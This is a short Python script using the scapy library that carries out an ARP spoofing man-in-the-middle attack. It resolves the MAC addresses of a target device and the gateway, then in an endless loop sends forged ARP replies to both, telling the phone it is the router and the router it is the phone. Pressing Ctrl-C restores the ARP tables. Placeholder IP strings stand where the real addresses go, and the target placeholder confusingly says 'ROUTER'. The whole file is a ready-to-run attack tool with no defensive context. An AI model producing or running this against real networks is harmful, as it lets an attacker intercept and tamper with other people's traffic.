import scapy.all as scapy
import time


def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packet = scapy.ARP(
        pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at"
    )
    scapy.send(spoofed_arp_packet, verbose=0)


def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, something = scapy.srp(arp_request, timeout=3, verbose=0)
    if reply:
        return reply[0][1].src
    return None


def wait_till_mac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC address for {} not found \n".format(ip))
    return mac


gateway_ip = "ENTER_GATEWAY_IP"
target_ip = "ENTER_ROUTER_IP"

target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)


def restore_arp(target_ip, source_ip):
    target_mac = scapy.getmacbyip(target_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac
    )
    scapy.send(packet, verbose=False)


try:
    while True:
        # Tell phone that I am the router
        spoof(target_ip, target_mac, gateway_ip)
        # Tell router that I am the phone
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(3)
except KeyboardInterrupt:
    restore_arp(target_ip, gateway_ip)
    restore_arp(gateway_ip, target_ip)
    print("Stoped spoofing and restored ARP tables")
